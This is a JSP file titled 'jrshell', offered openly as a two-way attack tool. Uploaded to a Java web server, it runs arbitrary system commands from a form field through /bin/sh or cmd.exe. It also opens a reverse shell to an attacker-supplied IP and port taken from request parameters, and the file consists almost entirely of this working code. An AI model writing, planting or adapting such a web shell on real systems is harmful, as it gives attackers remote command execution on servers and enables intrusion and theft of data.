<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%

    // Define the OS
    String shellPath = null;
    try
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}


    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;

        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));

        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;

        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }

        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    // Enhanced StreamConnector that handles prompt properly
    class InteractiveStreamConnector extends Thread
    {
        private InputStream processInput;
        private OutputStream socketOutput;
        private String prompt;

        InteractiveStreamConnector(InputStream processInput, OutputStream socketOutput, String prompt) {
            this.processInput = processInput;
            this.socketOutput = socketOutput;
            this.prompt = prompt;
        }

        public void run() {
            try {
                // Send initial prompt
                socketOutput.write(prompt.getBytes());
                socketOutput.flush();
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(processInput));
                StringBuilder outputBuffer = new StringBuilder();
                String line;
                
                while ((line = reader.readLine()) != null) {
                    outputBuffer.append(line).append("\n");
                    
                    // Check if this might be the end of command output
                    // Wait a bit to see if more output is coming
                    Thread.sleep(50); // Small delay to collect all output
                    
                    // If no more data available immediately, assume command finished
                    if (!reader.ready()) {
                        // Send all accumulated output
                        socketOutput.write(outputBuffer.toString().getBytes());
                        socketOutput.flush();
                        
                        // Send prompt after command completion
                        socketOutput.write(prompt.getBytes());
                        socketOutput.flush();
                        
                        // Clear the buffer for next command
                        outputBuffer.setLength(0);
                    }
                }
            } catch (Exception e) {}
        }
    }

    try {
        // Get IP and port from URL parameters
        String ip = request.getParameter("ip");
        String portStr = request.getParameter("port");
        
        if (ip != null && portStr != null) {
            int port = Integer.parseInt(portStr);
            Socket socket = new Socket(ip, port);
            Process process = Runtime.getRuntime().exec(shellPath);
            
            // Create prompt
            String clientIP = InetAddress.getLocalHost().getHostAddress();
            String username = System.getProperty("user.name");
            String prompt = clientIP + "@" + username + "> ";
            
            // Use the enhanced InteractiveStreamConnector for process output
            new InteractiveStreamConnector(process.getInputStream(), socket.getOutputStream(), prompt).start();
            new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
            
            out.println("Reverse shell connected to " + ip + ":" + port);
        }
     } catch( Exception e ){}


%>
</pre>
</body>
</html>